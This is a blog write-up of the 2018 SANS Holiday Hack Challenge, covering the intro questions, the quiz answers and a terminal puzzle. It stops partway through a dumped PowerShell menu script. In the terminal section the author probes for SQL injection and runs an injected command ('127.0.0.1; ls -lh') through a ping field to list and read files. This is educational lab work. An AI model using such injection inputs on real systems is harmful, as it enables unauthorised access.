<!DOCTYPE html>
<html lang="en">
<head>
  <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,400italic' rel='stylesheet' type='text/css'>
  <link rel="stylesheet" type="text/css" href="https://allyourbase.utouch.fr/theme/css/style.min.css">
  <link rel="stylesheet" type="text/css" href="https://allyourbase.utouch.fr/theme/css/pygments.min.css">
  <link rel="stylesheet" type="text/css" href="https://allyourbase.utouch.fr/theme/css/font-awesome.min.css">
  <link href="https://allyourbase.utouch.fr//extras/style.css" rel="stylesheet">
  <link href="https://allyourbase.utouch.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="All Your Base Are Belong To Me Atom">
  <link rel="shortcut icon" href="/extras/favicon.ico" type="image/x-icon">
  <link rel="icon" href="/extras/favicon.ico" type="image/x-icon">

  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="" />
<meta name="author" content="useless" />
<meta name="description" content="🎵 I'm dreaming of a pwned Christmaaaaas 🎵 As usual, here's my write-up for the 2018 SANS Christmas Challenge. Table of contents Introduction Orientation Challenge Bushy Evergreen's Cranberry Pi Challenge KringleCon Holiday Hack History questions Directory Browsing Minty Candycane's Cranberry Pi Challenge Analyzing the KringleCon CFP website de Bruijn Sequences Tangle Coalbox's …" />
<meta name="keywords" content="">
<meta property="og:site_name" content="All Your Base Are Belong To Me"/>
<meta property="og:title" content="SANS Christmas Challenge 2018"/>
<meta property="og:description" content="🎵 I'm dreaming of a pwned Christmaaaaas 🎵 As usual, here's my write-up for the 2018 SANS Christmas Challenge. Table of contents Introduction Orientation Challenge Bushy Evergreen's Cranberry Pi Challenge KringleCon Holiday Hack History questions Directory Browsing Minty Candycane's Cranberry Pi Challenge Analyzing the KringleCon CFP website de Bruijn Sequences Tangle Coalbox's …"/>
<meta property="og:locale" content="en_US"/>
<meta property="og:url" content="https://allyourbase.utouch.fr/posts/2019/01/14/sans-christmas-challenge-2018/"/>
<meta property="og:type" content="article"/>
<meta property="article:published_time" content="2019-01-14 00:00:00+01:00"/>
<meta property="article:modified_time" content=""/>
<meta property="article:author" content="https://allyourbase.utouch.fr/author/useless.html">
<meta property="article:section" content="Write-up"/>
<meta property="og:image" content="/images/useless_profile_pic.jpg">  <title>All Your Base Are Belong To Me &ndash; SANS Christmas Challenge 2018</title>
</head>
<body>
  <aside>
    <div>
      <a href="https://allyourbase.utouch.fr">
        <img src="/images/useless_profile_pic.jpg" alt="All Your Base Are Belong To Me" title="All Your Base Are Belong To Me">
      </a>
      <h1><a href="https://allyourbase.utouch.fr">All Your Base Are Belong To Me</a></h1>
      <p>You know, if that's alright with you</p>
      <nav>
        <ul class="list">
        </ul>
      </nav>
      <ul class="social">
        <li><a class="sc-envelope-o" href="mailto:yannick at meheut dot org" target="_blank"><i class="fa fa-envelope-o"></i></a></li>
        <li><a class="sc-github" href="https://github.com/the-useless-one/" target="_blank"><i class="fa fa-github"></i></a></li>
        <li><a class="sc-rss" href="https://allyourbase.utouch.fr/feeds/all.atom.xml" target="_blank"><i class="fa fa-rss"></i></a></li>
      </ul>
    </div>
  </aside>
  <main>
    <nav>
      <a href="https://allyourbase.utouch.fr">Home</a>
      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="https://allyourbase.utouch.fr/feeds/all.atom.xml">Atom</a>
    </nav>

<article>
  <header>
    <h1 id="sans-christmas-challenge-2018">SANS Christmas Challenge 2018</h1>
    <p>Posted on lun. 14 janvier 2019 in <a href="https://allyourbase.utouch.fr/category/write-up.html">Write-up</a></p>
  </header>
  <div>
    <img alt="sans_christmas_challenge_2018_logo.png" class="align-center" src="/images/sans-christmas-challenge-2018/sans_christmas_challenge_2018_logo.png" />
<p>🎵 I'm dreaming of a pwned Christmaaaaas 🎵 As usual, here's my write-up
for the <a class="reference external" href="https://holidayhackchallenge.com/2018/story.html">2018 SANS Christmas Challenge</a>.</p>
<div class="contents topic" id="table-of-contents">
<p class="topic-title first">Table of contents</p>
<ul class="simple">
<li><a class="reference internal" href="#introduction" id="id5">Introduction</a></li>
<li><a class="reference internal" href="#orientation-challenge" id="id6">Orientation Challenge</a><ul>
<li><a class="reference internal" href="#bushy-evergreen-s-cranberry-pi-challenge" id="id7">Bushy Evergreen's Cranberry Pi Challenge</a></li>
<li><a class="reference internal" href="#kringlecon-holiday-hack-history-questions" id="id8">KringleCon Holiday Hack History questions</a></li>
</ul>
</li>
<li><a class="reference internal" href="#directory-browsing" id="id9">Directory Browsing</a><ul>
<li><a class="reference internal" href="#minty-candycane-s-cranberry-pi-challenge" id="id10">Minty Candycane's Cranberry Pi Challenge</a></li>
<li><a class="reference internal" href="#analyzing-the-kringlecon-cfp-website" id="id11">Analyzing the KringleCon CFP website</a></li>
</ul>
</li>
<li><a class="reference internal" href="#de-bruijn-sequences" id="id12">de Bruijn Sequences</a><ul>
<li><a class="reference internal" href="#tangle-coalbox-s-cranberry-pi-challenge" id="id13">Tangle Coalbox's Cranberry Pi Challenge</a></li>
<li><a class="reference internal" href="#kringlecon-speaker-unpreparedness-room" id="id14">KringleCon Speaker Unpreparedness room</a><ul>
<li><a class="reference internal" href="#yannick-s-dirty-solution" id="id15">Yannick's (dirty) solution</a></li>
<li><a class="reference internal" href="#the-official-solution" id="id16">The &quot;official&quot; solution</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#data-repo-analysis" id="id17">Data Repo Analysis</a><ul>
<li><a class="reference internal" href="#wunorse-openslae-s-cranberry-pi-challenge" id="id18">Wunorse Openslae's Cranberry Pi Challenge</a></li>
<li><a class="reference internal" href="#north-pole-git-repository" id="id19">North Pole Git Repository</a></li>
</ul>
</li>
<li><a class="reference internal" href="#ad-privilege-discovery" id="id20">AD Privilege Discovery</a><ul>
<li><a class="reference internal" href="#holly-evergreen-s-cranberry-pi-challenge" id="id21">Holly Evergreen's Cranberry Pi Challenge</a></li>
<li><a class="reference internal" href="#sans-slingshot-linux-image" id="id22">SANS Slingshot Linux image</a></li>
</ul>
</li>
<li><a class="reference internal" href="#badge-manipulation" id="id23">Badge Manipulation</a><ul>
<li><a class="reference internal" href="#pepper-minstix-cranberry-pi-challenge" id="id24">Pepper Minstix' Cranberry Pi Challenge</a></li>
<li><a class="reference internal" href="#bypassing-the-door-authentication-mechanism" id="id25">Bypassing the door authentication mechanism</a><ul>
<li><a class="reference internal" href="#the-haxxor-way" id="id26">The &quot;haXXor&quot; way</a><ul>
<li><a class="reference internal" href="#all-the-dead-ends-yay" id="id27">All the dead ends, yay!</a></li>
<li><a class="reference internal" href="#the-right-solution" id="id28">The right solution</a></li>
</ul>
</li>
<li><a class="reference internal" href="#the-john-mcclane-way" id="id29">The &quot;John McClane&quot; way</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#hr-incident-response" id="id30">HR Incident Response</a><ul>
<li><a class="reference internal" href="#sparkle-redberry-s-cranberry-pi-challenge" id="id31">Sparkle Redberry's Cranberry Pi Challenge</a></li>
<li><a class="reference internal" href="#elf-infosec-careers-website" id="id32">Elf InfoSec Careers Website</a></li>
</ul>
</li>
<li><a class="reference internal" href="#network-traffic-forensics" id="id33">Network Traffic Forensics</a><ul>
<li><a class="reference internal" href="#sugarplum-mary-s-cranberry-pi-challenge" id="id34">SugarPlum Mary's Cranberry Pi Challenge</a></li>
<li><a class="reference internal" href="#packet-capture-and-analysis-website" id="id35">Packet Capture and Analysis Website</a></li>
</ul>
</li>
<li><a class="reference internal" href="#ransomware-recovery" id="id36">Ransomware Recovery</a><ul>
<li><a class="reference internal" href="#shiny-upatree-s-cranberry-pi-challenge" id="id37">Shiny Upatree's Cranberry Pi Challenge</a><ul>
<li><a class="reference internal" href="#id1" id="id38">Yannick's (dirty) solution</a></li>
<li><a class="reference internal" href="#id2" id="id39">The &quot;official&quot; solution</a></li>
</ul>
</li>
<li><a class="reference internal" href="#snort-rule" id="id40">Snort Rule</a></li>
<li><a class="reference internal" href="#malware-dropper" id="id41">Malware Dropper</a></li>
<li><a class="reference internal" href="#malware-analysis" id="id42">Malware Analysis</a></li>
<li><a class="reference internal" href="#memory-dump-analysis" id="id43">Memory Dump Analysis</a><ul>
<li><a class="reference internal" href="#id3" id="id44">All the dead ends, yay!</a></li>
<li><a class="reference internal" href="#id4" id="id45">The right solution</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#who-is-behind-it-all" id="id46">Who Is Behind It All?</a></li>
<li><a class="reference internal" href="#answers-to-the-questions" id="id47">Answers to the questions</a></li>
<li><a class="reference internal" href="#conclusion" id="id48">Conclusion</a></li>
<li><a class="reference internal" href="#appendix-chocolate-chip-cookie-recipe" id="id49">Appendix: Chocolate Chip Cookie Recipe</a></li>
</ul>
</div>
<div class="section" id="introduction">
<h2><a class="toc-backref" href="#id5">Introduction</a></h2>
<p>This year, we're invited by Santa to KringleCon! It's a security conference,
with several talks by renowned security professionals. Santa organized this
conference because of the security breaches that occured during these past
Christmases. He also decided to up the physical security, as we can see toy
soldiers patrolling. They seem to obey to some guy named <a class="reference external" href="https://en.wikipedia.org/wiki/List_of_Die_Hard_characters#Hans_Gruber">Hans</a>,
who is also here. Let's hope that things don't go awry this year!</p>
<img alt="santa.png" class="align-center" src="/images/sans-christmas-challenge-2018/santa.png" />
<p><em>Santa says</em></p>
<blockquote>
<p>Welcome, my friends! Welcome to my castle! Would you come forward please?</p>
<p>Welcome. It’s nice to have you here! I’m so glad you could come. This is
going to be such an exciting day!</p>
<p>I hope you enjoy it. I think you will.</p>
<p>Today is the start of KringleCon, our new conference for cyber security
practitioners and hackers around the world.</p>
<p>KringleCon is designed to share tips and tricks to help leverage our skills
to make the world a better, safer place.</p>
<p>Remember to look around, enjoy some talks by world-class speakers, and
mingle with our other guests.</p>
<p>And, if you are interested in the background of this con, please check out
Ed Skoudis’ talk called <a class="reference external" href="https://youtu.be/31JsKzsbFUo">START HERE</a>.</p>
<p>Delighted to meet you. Overjoyed! Enraptured! Entranced! Are we ready? Yes!
In we go!</p>
</blockquote>
<p>Here are the questions we must answer:</p>
<ol class="arabic simple">
<li>What phrase is revealed when you answer all of the <a class="reference external" href="https://www.holidayhackchallenge.com/2018/challenges/osint_challenge_windows.html">KringleCon Holiday Hack
History questions</a>?</li>
<li>Who submitted (First Last) the rejected talk titled <strong>Data Loss for Rainbow
Teams: A Path in the Darkness</strong>?</li>
<li>The KringleCon Speaker Unpreparedness room is a place for frantic speakers
to furiously complete their presentations. The room is protected by a door
passcode. Upon entering the correct passcode, what message is presented to
the speaker?</li>
<li>Retrieve the encrypted ZIP file from the North Pole Git repository. What is
the password to open this file?</li>
<li>Using the data set contained in this <a class="reference external" href="https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova">SANS Slingshot Linux image</a>,
find a reliable path from a Kerberoastable user to the Domain Admins group.
What’s the user’s logon name (in <a class="reference external" href="mailto:username&#64;domain.tld">username&#64;domain.tld</a> format)?</li>
<li>Bypass the authentication mechanism associated with the room near Pepper
Minstix. <a class="reference external" href="https://www.holidayhackchallenge.com/2018/challenges/alabaster_badge.jpg">A sample employee badge is available</a>.
What is the access control number revealed by the <a class="reference external" href="https://scanomatic.kringlecastle.com/index.html">door authentication
panel</a>?</li>
<li>Santa uses an Elf Resources website to look for talented information
security professionals. <a class="reference external" href="https://careers.kringlecastle.com/">Gain access to the website</a> and fetch the document
<code>C:\candidate_evaluation.docx</code>. Which terrorist organization is
secretly supported by the job applicant whose name begins with &quot;K&quot;?</li>
<li>Santa has introduced a <a class="reference external" href="https://packalyzer.kringlecastle.com/">web-based packet capture and analysis tool</a> to support the elves and their
information security work. Using the system, access and decrypt HTTP/2
network activity. What is the name of the song described in the document
sent from Holly Evergreen to Alabaster Snowball?</li>
<li>Alabaster Snowball is in dire need of your help. Santa's file server has
been hit with malware. Help Alabaster Snowball deal with the malware on
Santa's server by completing several tasks. To start, assist Alabaster by
accessing (clicking) the snort terminal below. Then create a rule that will
catch all new infections. What is the success message displayed by the Snort
terminal?</li>
<li>After completing the prior question, Alabaster gives you a document he
suspects downloads the malware. What is the domain name the malware in the
document downloads from?</li>
<li>Analyze the full malware source code to find a kill-switch and activate it
at the North Pole's domain registrar <a class="reference external" href="https://hohohodaddy.kringlecastle.com/index.html">HoHoHo Daddy</a>. What is the full
sentence text that appears on the domain registration success message
(bottom sentence)?</li>
<li>After activating the kill-switch domain in the last question, Alabaster
gives you a <a class="reference external" href="https://www.holidayhackchallenge.com/2018/challenges/forensic_artifacts.zip">zip file</a>
with a memory dump and encrypted password database. Use these files to
decrypt Alabaster's password database. What is the password entered in the
database for the Vault entry?</li>
<li>Use what you have learned from previous challenges to open the <a class="reference external" href="https://pianolockn.kringlecastle.com/">door to
Santa's vault</a>. What message do
you get when you unlock the door?</li>
<li>Who was the mastermind behind the whole KringleCon plan?</li>
</ol>
<p>As was done last year, we'll try not to rely on the hints given by the elves,
because it's more fun to try to find solutions in your own way. This is what
allows you to come up with creative solutions. So I'll post the solutions to
the Cranberry Pi challenges, but we won't use the hints that are given after
solving.</p>
<p><strong>Disclaimer</strong>: I did use the hints for question 12, but not before I wasted
soooo much time exploring soooo many dead-ends. Fun!</p>
<p>As usual, I'll try to detail my thought process as much as possible, including
dead-ends and mistakes (that's the best way to learn).</p>
<p>Alright, let's get to it!</p>
</div>
<div class="section" id="orientation-challenge">
<h2><a class="toc-backref" href="#id6">Orientation Challenge</a></h2>
<div class="section" id="bushy-evergreen-s-cranberry-pi-challenge">
<h3><a class="toc-backref" href="#id7">Bushy Evergreen's Cranberry Pi Challenge</a></h3>
<p>Bushy Evergreen seems to be having problem with exiting his text editor. Can
you guess the editor?</p>
<pre class="literal-block">
                ........................................
             .;oooooooooooool;,,,,,,,,:loooooooooooooll:
           .:oooooooooooooc;,,,,,,,,:ooooooooooooollooo:
         .';;;;;;;;;;;;;;,''''''''';;;;;;;;;;;;;,;ooooo:
       .''''''''''''''''''''''''''''''''''''''''';ooooo:
     ;oooooooooooool;''''''',:loooooooooooolc;',,;ooooo:
  .:oooooooooooooc;',,,,,,,:ooooooooooooolccoc,,,;ooooo:
.cooooooooooooo:,''''''',:ooooooooooooolcloooc,,,;ooooo,
coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,,;ooo,
coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,,;l'
coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,..
coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc.
coooooooooooooo,,,,,,,,,;ooooooooooooooloooo:.
coooooooooooooo,,,,,,,,,;ooooooooooooooloo;
:llllllllllllll,'''''''';llllllllllllllc,

I'm in quite a fix, I need a quick escape.
Pepper is quite pleased, while I watch here, agape.
Her editor's confusing, though &quot;best&quot; she says - she yells!
My lesson one and your role is exit back to shellz.

-Bushy Evergreen

Exit vi.
</pre>
<p>We appear to be in a <code>vi</code>-edited document, and we have to exit
<code>vi</code>. Luckily for me, that's also my editor of choice. First, you have
to make sure that you are in command mode, by pressing <code>Escape</code>. Then,
you can simply exit <code>vi</code> by typing <code>:q</code>, followed by <code>Enter</code>.</p>
<p>What's more, if you press <code>Ctrl + C</code> while in <code>vi</code>, the following
message is displayed: <code>Type :quit&lt;Enter&gt; to exit Vim</code>.</p>
</div>
<div class="section" id="kringlecon-holiday-hack-history-questions">
<h3><a class="toc-backref" href="#id8">KringleCon Holiday Hack History questions</a></h3>
<p>We are tasked with performing a little bit of <a class="reference external" href="https://en.wikipedia.org/wiki/Open-source_intelligence">OSINT</a>
in order to answer some questions, regarding the three last SANS Christmas
Challenges. Fortunately, all the answers can be found in your favorite SANS
Christmas Challenge write-ups! The correct answers are marked, and I give you
a link to my past write-ups where the answers can be found. Alternatively, you
can find the answers in <a class="reference external" href="https://www.youtube.com/watch?v=31JsKzsbFUo">Ed Skoudis' introduction video to KringleCon</a>.</p>
<ol class="arabic simple">
<li>In 2015, the Dosis siblings asked for help understanding what piece of their
&quot;Gnome in Your Home&quot; toy?<ol class="loweralpha">
<li><code>[✓]</code> Firmware (answer <a class="reference external" href="/posts/2016/01/09/sans-christmas-challenge-2015/#part-2-ill-be-gnome-for-christmas-firmware-analysis-for-fun-and-profit">here</a>)</li>
<li><code>[ ]</code> Clothing</li>
<li><code>[ ]</code> Wireless adapter</li>
<li><code>[ ]</code> Flux capacitor</li>
</ol>
</li>
<li>In 2015, the Dosis siblings disassembled the conspiracy dreamt up by which
corporation?<ol class="loweralpha">
<li><code>[ ]</code> Elgnirk</li>
<li><code>[✓]</code> ATNAS (answer <a class="reference external" href="/posts/2016/01/09/sans-christmas-challenge-2015/#part-3-let-it-gnome-let-it-gnome-let-it-gnome-internet-wide-scavenger-hunt">here</a>)</li>
<li><code>[ ]</code> GIYH</li>
<li><code>[ ]</code> Savvy, Inc.</li>
</ol>
</li>
<li>In 2016, participants were sent off on a problem-solving quest based on what
artifact that Santa left?<ol class="loweralpha">
<li><code>[ ]</code> Tom-tom drums</li>
<li><code>[ ]</code> DNA on a mug of milk</li>
<li><code>[ ]</code> Cookie crumbs</li>
<li><code>[✓]</code> Business card (answer <a class="reference external" href="/posts/2017/01/05/sans-christmas-challenge-2016/#part-1-a-most-curious-business-card">here</a>)</li>
</ol>
</li>
<li>In 2016, Linux terminals at the North Pole could be accessed with what kind
of computer?<ol class="loweralpha">
<li><code>[ ]</code> Snozberry Pi</li>
<li><code>[ ]</code> Blueberry Pi</li>
<li><code>[✓]</code> Cranberry Pi (answer <a class="reference external" href="/posts/2017/01/05/sans-christmas-challenge-2016/#part-3-a-fresh-baked-holiday-pi">here</a>)</li>
<li><code>[ ]</code> Elderberry Pi</li>
</ol>
</li>
<li>In 2017, the North Pole was being bombarded by giant objects. What were
they?<ol class="loweralpha">
<li><code>[ ]</code> TCP packets</li>
<li><code>[✓]</code> Snowballs (answer <a class="reference external" href="/posts/2018/01/10/sans-christmas-challenge-2017/#introduction">here</a>)</li>
<li><code>[ ]</code> Misfit toys</li>
<li><code>[ ]</code> Candy canes</li>
</ol>
</li>
<li>In 2017, Sam the snowman needed help reassembling pages torn from what?<ol class="loweralpha">
<li><code>[ ]</code> The Bash man page</li>
<li><code>[ ]</code> Scrooge's payroll ledger</li>
<li><code>[ ]</code> System swap space</li>
<li><code>[✓]</code> The Great Book (answer <a class="reference external" href="/posts/2018/01/10/sans-christmas-challenge-2017/#introduction">here</a>)</li>
</ol>
</li>
</ol>
<p>Answering correctly these questions gives us the hidden phrase,
<code>Happy Trails</code>.</p>
</div>
</div>
<div class="section" id="directory-browsing">
<h2><a class="toc-backref" href="#id9">Directory Browsing</a></h2>
<div class="section" id="minty-candycane-s-cranberry-pi-challenge">
<h3><a class="toc-backref" href="#id10">Minty Candycane's Cranberry Pi Challenge</a></h3>
<p>A new employee, Mr Chan, is arriving. However, in order to make his name tag,
we find his first name.</p>
<pre class="literal-block">
We just hired this new worker,
Californian or New Yorker?
Think he's making some new toy bag...
My job is to make his name tag.
Golly gee, I'm glad that you came,
I recall naught but his last name!
Use our system or your own plan,
Find the first name of our guy &quot;Chan!&quot;
-Bushy Evergreen
To solve this challenge, determine the new worker's first name and submit to runtoanswer.
====================================================================
=                                                                  =
= S A N T A ' S  C A S T L E  E M P L O Y E E  O N B O A R D I N G =
=                                                                  =
====================================================================
 Press  1 to start the onboard process.
 Press  2 to verify the system.
 Press  q to quit.
Please make a selection:
</pre>
<p>We get access to a simple interface. By pressing <code>1</code>, we can enter a new
employee's information:</p>
<div class="highlight"><pre><span></span>Welcome to Santa&#39;s Castle!
At Santa&#39;s Castle, our employees are our family. We care for each other,
and support everyone in our common goals.
Your first test at Santa&#39;s Castle is to complete the new employee onboarding paperwork.
Don&#39;t worry, it&#39;s an easy test! Just complete the required onboarding information below.
Enter your first name.
<span class="hll">: John
</span>Enter your last name.
<span class="hll">: McClane
</span>Enter your street address (line 1 of 2).
<span class="hll">: Test Street
</span>Enter your street address (line 2 of 2).
:
Enter your city.
<span class="hll">: New York
</span>Enter your postal code.
<span class="hll">: 1111
</span>Enter your phone number.
:
Enter your email address.
:
Is this correct?
John McClane
Test Street
New York, 1111
<span class="hll">y/n: y
</span>Save to sqlite DB using command line
Press Enter to continue...:
</pre></div>
<p>Apparently, the result is saved in a SQLite database. We can try a SQL
injection, and we'll see that special characters are, indeed, not sanitized:</p>
<div class="highlight"><pre><span></span>Welcome to Santa&#39;s Castle!
At Santa&#39;s Castle, our employees are our family. We care for each other,
and support everyone in our common goals.
Your first test at Santa&#39;s Castle is to complete the new employee onboarding paperwork.
Don&#39;t worry, it&#39;s an easy test! Just complete the required onboarding information below.
Enter your first name.
<span class="hll">: John&#39;
</span>Enter your last name.
:
Enter your street address (line 1 of 2).
:
Enter your street address (line 2 of 2).
:
Enter your city.
:
Enter your postal code.
:
Enter your phone number.
:
Enter your email address.
:
Is this correct?
John&#39;

,
y/n: y
Save to sqlite DB using command line
<span class="hll">Error: unrecognized token: &quot;&#39;John&#39;&#39;,&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;)&quot;
</span>Press Enter to continue...:
</pre></div>
<p>So, there is indeed a SQL injection. However, it seems to be in an
<code>INSERT</code>-kind of statement. While it's possible to perform SQL injection
in these statements, it's kind of a pain, because most of the time, you can't
get the result of your injection.</p>
<p>So, let's take a look at the other functionality of the menu:</p>
<div class="highlight"><pre><span></span><span class="hll">Please make a selection: 2
</span>Validating data store for employee onboard information.
<span class="hll">Enter address of server: 127.0.0.1
</span>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.070 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.075 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.051 ms
--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2039ms
rtt min/avg/max/mdev = 0.051/0.065/0.075/0.012 ms
onboard.db: SQLite 3.x database
Press Enter to continue...:
</pre></div>
<p>So, the program seems to perform a <code>ping</code> on an IP address that we give,
and then to analyze a file called <code>onboard.db</code>, which seems to be our
SQLite database. Let's see if our IP address is correctly sanitized, or if we
can try some basic command injection:</p>
<div class="highlight"><pre><span></span>Validating data store for employee onboard information.
<span class="hll">Enter address of server: 127.0.0.1; ls -lh
</span>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.059 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.065 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.064 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2001ms
rtt min/avg/max/mdev = 0.059/0.062/0.065/0.009 ms
total 5.4M
<span class="hll">-rw-r--r-- 1 root root 3.8K Dec 14 16:13 menu.ps1
</span><span class="hll">-rw-rw-rw- 1 root root  24K Dec 14 16:13 onboard.db
</span><span class="hll">-rwxr-xr-x 1 root root 5.3M Dec 14 16:13 runtoanswer
</span>onboard.db: SQLite 3.x database
</pre></div>
<p>It worked! We were able to execute arbitrary commands, and list the content of
the current directory. The <code>menu.ps1</code> file seems to be a PowerShell
script which displays the menu of the Cranberry Pi. The <code>runtoanswer</code>
file seems to be an executable that we have to run in order to give our answer,
to wit the first name of Mr Chan. Let's take a look at <code>menu.ps1</code>. We can
do this by using our arbitrary command execution to <code>cat menu.ps1</code>:</p>
<div class="highlight"><pre><span></span><span class="nv">$global:firstrun</span> <span class="p">=</span> <span class="nv">$TRUE</span>
<span class="k">function</span> <span class="nb">Show-Menu</span>
<span class="p">{</span>
    <span class="nv">$intro</span> <span class="p">=</span> <span class="p">@(</span>
        <span class="s2">&quot;We just hired this new worker,&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Californian or New Yorker?&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Think he&#39;s making some new toy bag...&quot;</span><span class="p">,</span>
        <span class="s2">&quot;My job is to make his name tag.&quot;</span><span class="p">,</span>
        <span class="s2">&quot;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Golly gee, I&#39;m glad that you came,&quot;</span><span class="p">,</span>
        <span class="s2">&quot;I recall naught but his last name!&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Use our system or your own plan,&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Find the first name of our guy </span><span class="se">`&quot;</span><span class="s2">Chan!</span><span class="se">`&quot;</span><span class="s2">&quot;</span><span class="p">,</span>
        <span class="s2">&quot;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;-Bushy Evergreen&quot;</span><span class="p">,</span>
        <span class="s2">&quot;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;To solve this challenge, determine the new worker&#39;s first name and submit to runtoansw</span>
<span class="s2">er.&quot;</span>
    <span class="p">)</span>
    <span class="nv">$header</span> <span class="p">=</span> <span class="p">@(</span>
        <span class="s2">&quot;====================================================================&quot;</span>
        <span class="s2">&quot;=                                                                  =&quot;</span><span class="p">,</span>
        <span class="s2">&quot;= S A N T A &#39; S  C A S T L E  E M P L O Y E E  O N B O A R D I N G =&quot;</span><span class="p">,</span>
        <span class="s2">&quot;=                                                                  =&quot;</span><span class="p">,</span>
        <span class="s2">&quot;====================================================================&quot;</span>
    <span class="p">)</span>
    <span class="n">cls</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$global:firstrun</span> <span class="o">-eq</span> <span class="nv">$TRUE</span><span class="p">)</span> <span class="p">{</span>
        <span class="nb">Write-Host</span> <span class="s2">&quot;</span><span class="se">`n`n</span><span class="s2">&quot;</span>
        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="p">=</span> <span class="n">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">-lt</span> <span class="nv">$intro</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="nv">$i</span><span class="p">++)</span> <span class="p">{</span>
    <span class="nb">Write-Host</span> <span class="s2">&quot;</span><span class="se">`n`n</span><span class="s2">Is this correct?</span><span class="se">`n`n</span><span class="s2">&quot;</span>
            <span class="nb">Write-Host</span> <span class="nv">$intro</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span>
        <span class="p">}</span>
        <span class="nv">$global:firstrun</span> <span class="p">=</span> <span class="nv">$FALSE</span>
    <span class="p">}</span>

    <span class="nb">Write-Host</span> <span class="s2">&quot;</span><span class="se">`n`n`n</span><span class="s2">&quot;</span>
    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="p">=</span> <span class="n">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">-lt</span> <span class="nv">$header</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="nv">$i</span><span class="p">++)</span> <span class="p">{</span>
        <span class="nb">Write-Host</span> <span class="nv">$header</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span>
    <span class="p">}</span>
    <span class="nb">Write-Host</span> <span class="s2">&quot;</span><span class="se">`n`n`n</span><span class="s2">&quot;</span>
    <span class="nb">Write-Host</span> <span class="s1">&#39; Press &#39;</span><span class="n">1</span><span class="s1">&#39; to start the onboard process.&#39;</span>
    <span class="nb">Write-Host</span> <span class="s1">&#39; Press &#39;</span><span class="n">2</span><span class="s1">&#39; to verify the system.&#39;</span>
    <span class="nb">Write-Host</span> <span class="s1">&#39; Press &#39;</span><span class="n">q</span><span class="s1">&#39; to quit.&#39;</span>
    <span class="nb">Write-Host</span> <span class="s2">&quot;</span><span class="se">`n</span><span class="s2">&quot;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">Employee-Onboarding-Form</span>
<span class="p">{</span>
    <span class="nb">Write-Host</span> <span class="s2">&quot;</span><span class="se">`n`n</span><span class="s2">Welcome to Santa&#39;s Castle!</span><span class="se">`n`n</span><span class="s2">&quot;</span>
    <span class="nb">Write-Host</span> <span class="s2">&quot;At Santa&#39;s Castle, our employees are our family. We care for each other,&quot;</span>
    <span class="nb">Write-Host</span> <span class="s2">&quot;and support everyone in our common goals.</span><span class="se">`n</span><span class="s2">&quot;</span>
    <span class="nb">Write-Host</span> <span class="s2">&quot;Your first test at Santa&#39;s Castle is to complete the new employee onboarding paperwork.&quot;</span>
    <span class="nb">Write-Host</span> <span class="s2">&quot;Don&#39;t worry, it&#39;s an easy test! Just complete the required onboarding information below.</span><span class="se">`n`n</span><span class="s2">&quot;</span>

    <span class="nv">$efirst</span> <span class="p">=</span> <span class="nb">Read-Host</span> <span class="s2">&quot;Enter your first name.</span><span class="se">`n</span><span class="s2">&quot;</span>
    <span class="nv">$elast</span> <span class="p">=</span> <span class="nb">Read-Host</span> <span class="s2">&quot;Enter your last name.</span><span class="se">`n</span><span class="s2">&quot;</span>
    <span class="nv">$estreet1</span> <span class="p">=</span> <span class="nb">Read-Host</span> <span class="s2">&quot;Enter your street address (line 1 of 2).</span><span class="se">`n</span><span class="s2">&quot;</span>
    <span class="nv">$estreet2</span> <span class="p">=</span> <span class="nb">Read-Host</span> <span class="s2">&quot;Enter your street address (line 2 of 2).</span><span class="se">`n</span><span class="s2">&quot;</span>
    <span class="nv">$ecity</span> <span class="p">=</span> <span class="nb">Read-Host</span> <span class="s2">&quot;Enter your city.</span><span class="se">`n</span><span class="s2">&quot;</span>
    <span class="nv">$epostalcode</span> <span class="p">=</span> <span class="nb">Read-Host</span> <span class="s2">&quot;Enter your postal code.</span><span class="se">`n</span><span class="s2">&quot;</span>
    <span class="nv">$ephone</span> <span class="p">=</span> <span class="nb">Read-Host</span> <span class="s2">&quot;Enter your phone number.</span><span class="se">`n</span><span class="s2">&quot;</span>
